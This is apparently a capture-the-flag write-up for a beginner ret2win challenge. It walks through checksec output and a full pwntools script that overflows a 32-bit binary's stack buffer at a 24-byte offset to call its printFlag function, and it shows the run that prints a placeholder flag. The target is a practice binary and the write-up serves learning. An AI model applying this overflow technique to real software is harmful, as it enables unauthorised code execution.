### Binary Exploitation

### Source: TU_19

### Overview: A basic ret2win 

### Basic File Checks 

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/thefirst]
└─$ file thefirst
thefirst: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=d5cdb22c21ed1fe37f1d5d30ba2ddb7c03e34e9a, for GNU/Linux 3.2.0, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/thefirst]
└─$ checksec thefirst 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/thefirst/thefirst'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Here's the exploit which will get the offset and overwrite the eip to call the printFlag func

```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    #ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Set up pwntools for the correct architecture
exe = './thefirst'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# How many bytes to the instruction pointer (EIP)?
offset = find_ip(cyclic(100))

payload = flat(
    b'A' * offset,
    elf.functions.printFlag  # 0x080491f6
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b'>', payload)

# Receive the flag
io.interactive()
```

On running it 

```
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/thefirst]
└─$ python2 exploit.py
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[+] Starting local process './thefirst': pid 91321
[+] Parsing corefile...: Done
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/thefirst/core.91322'
    Arch:      i386-32-little
    EIP:       0x61616167
    ESP:       0xffdf20e0
    Exe:       '/home/mark/Documents/Pentest/BOF/03-begineer_bof/thefirst/thefirst' (0x8048000)
    Fault:     0x61616167
[!] located EIP/RIP offset at 24
[*] Switching to interactive mode
 FLAG{F4K3_FL4G}
[*] Got EOF while reading in interactive
$
```

And we're done 

<br> <br>
[Back To Home](../../index.md)
